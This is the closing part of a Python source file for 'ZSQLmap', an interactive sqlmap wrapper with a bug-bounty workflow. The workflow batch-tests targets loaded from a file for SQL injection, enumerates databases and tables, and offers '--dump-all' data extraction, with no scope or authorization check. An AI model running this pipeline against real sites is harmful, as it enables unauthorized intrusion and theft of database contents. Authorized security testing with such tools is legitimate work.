                _, audit_id, vuln_type, parameter, payload, confidence, severity, description, proof = vuln

                print(f"  {Config.COLORS['RED']}{severity.upper()}{Config.COLORS['RESET']}: {vuln_type} in {parameter}")
                print(f"     Payload: {payload[:50]}...")
                print(f"     Confidence: {confidence}%")
                print()

    def bug_bounty_workflow(self):
        """Bug bounty workflow"""
        self._print_status("Bug Bounty Workflow", "info")

        print(f"\n{Config.COLORS['CYAN']}Bug Bounty Pipeline:{Config.COLORS['RESET']}")
        print("  1. Reconnaissance")
        print("  2. Target selection")
        print("  3. Automated scanning")
        print("  4. Manual testing")
        print("  5. Report generation")

        stage = input(f"\n{Config.COLORS['YELLOW']}[?] Current stage (1-5):{Config.COLORS['RESET']} ").strip()

        if stage == "1":
            self._print_status("Reconnaissance Phase", "info")
            print("\nRecommended actions:")
            print("  • Use subdomain enumeration tools")
            print("  • Use Zenogon for port scanning")
            print("  • Identify web technologies")
            print("  • Map application endpoints")

        elif stage == "2":
            self._print_status("Target Selection", "info")
            target_file = input(f"{Config.COLORS['YELLOW']}[?] Path to targets file:{Config.COLORS['RESET']} ").strip()

            if os.path.exists(target_file):
                with open(target_file) as f:
                    targets = [line.strip() for line in f if line.strip()]

                print(f"\n{len(targets)} targets loaded")
                print("Testing each for SQL injection...")

                for target in targets[:5]:  # Test first 5
                    self._print_status(f"Testing: {target}", "info")
                    self.engine.run_sqlmap(target, "basic")

        elif stage == "3":
            self._print_status("Automated Scanning", "info")
            url = input(f"{Config.COLORS['YELLOW']}[?] Target URL:{Config.COLORS['RESET']} ").strip()

            # Full automated scan
            self._print_status("Starting comprehensive scan...", "info")

            # Step 1: Basic detection
            result1 = self.engine.run_sqlmap(url, "basic")

            if result1 and result1.get('vulnerabilities'):
                # Step 2: Database enumeration
                self._print_status("Vulnerability found! Enumerating...", "found")
                self.engine.run_sqlmap(url, "standard", "--dbs --tables")

                # Step 3: Data extraction
                extract = input(f"\n{Config.COLORS['YELLOW']}[?] Extract data? (y/N):{Config.COLORS['RESET']} ").strip().lower()
                if extract == 'y':
                    self.engine.run_sqlmap(url, "standard", "--dump-all")

        elif stage == "4":
            self._print_status("Manual Testing", "info")
            print("\nManual testing techniques:")
            print("  1. Test all parameters")
            print("  2. Test HTTP headers")
            print("  3. Test JSON parameters")
            print("  4. Test XML inputs")

            technique = input(f"\n{Config.COLORS['YELLOW']}[?] Select technique:{Config.COLORS['RESET']} ").strip()

            if technique == "1":
                url = input(f"{Config.COLORS['YELLOW']}[?] URL with parameters:{Config.COLORS['RESET']} ").strip()
                self.capture_and_test()

            elif technique == "2":
                self._print_status("HTTP Header testing coming soon...", "info")

            elif technique == "3":
                url = input(f"{Config.COLORS['YELLOW']}[?] JSON endpoint:{Config.COLORS['RESET']} ").strip()
                json_data = input(f"{Config.COLORS['YELLOW']}[?] JSON data:{Config.COLORS['RESET']} ").strip()

                try:
                    data = json.loads(json_data)
                except:
                    data = {"input": json_data}

                headers = {"Content-Type": "application/json"}
                result = self.bridge.capture_request("POST", url, json=data, headers=headers)

                if result['success']:
                    self.engine.run_sqlmap_on_request(result['request_file'], "standard")

        elif stage == "5":
            self._print_status("Report Generation", "info")

            # Generate report from database
            vulnerabilities = self.db.get_vulnerabilities()

            if vulnerabilities:
                report_file = f"bug_bounty_report_{datetime.now().strftime('%Y%m%d')}.txt"

                with open(report_file, 'w') as f:
                    f.write(f"Bug Bounty Report\n")
                    f.write(f"Generated: {datetime.now().isoformat()}\n")
                    f.write("="*60 + "\n\n")

                    f.write("VULNERABILITIES FOUND:\n")
                    f.write("="*60 + "\n\n")

                    for vuln in vulnerabilities:
                        _, audit_id, vuln_type, parameter, payload, confidence, severity, description, proof = vuln

                        f.write(f"Severity: {severity}\n")
                        f.write(f"Type: {vuln_type}\n")
                        f.write(f"Parameter: {parameter}\n")
                        f.write(f"Payload: {payload}\n")
                        f.write(f"Confidence: {confidence}%\n")
                        f.write(f"Description: {description}\n")
                        f.write(f"Proof: {proof[:200]}...\n")
                        f.write("-"*40 + "\n\n")

                self._print_status(f"Report generated: {report_file}", "success")
            else:
                self._print_status("No vulnerabilities to report", "warning")

    def _print_status(self, message, status="info"):
        """Print status with colors"""
        colors = Config.COLORS

        prefixes = {
            "info": f"{colors['BLUE']}[*]{colors['RESET']}",
            "success": f"{colors['GREEN']}[✓]{colors['RESET']}",
            "error": f"{colors['RED']}[✗]{colors['RESET']}",
            "warning": f"{colors['YELLOW']}[!]{colors['RESET']}",
            "found": f"{colors['MAGENTA']}[+]{colors['RESET']}"
        }

        print(f"{prefixes.get(status, prefixes['info'])} {message}")

# ========== MAIN ==========
def main():
    """Main entry point"""
    try:
        # Check for sqlmap
        try:
            subprocess.run(["which", "sqlmap"], capture_output=True, check=True)
        except:
            print(f"{Config.COLORS['RED']}[!] SQLmap not found!{Config.COLORS['RESET']}")
            print(f"{Config.COLORS['YELLOW']}[*] Install with: pkg install sqlmap{Config.COLORS['RESET']}")
            return

        # Start ZSQLmap
        zsqlmap = ZSQLmap()
        zsqlmap.interactive_mode()

    except KeyboardInterrupt:
        print(f"\n\n{Config.COLORS['YELLOW']}[!] Program interrupted{Config.COLORS['RESET']}")
    except Exception as e:
        print(f"\n{Config.COLORS['RED']}[✗] Fatal error: {str(e)}{Config.COLORS['RESET']}")

if __name__ == "__main__":
    main()
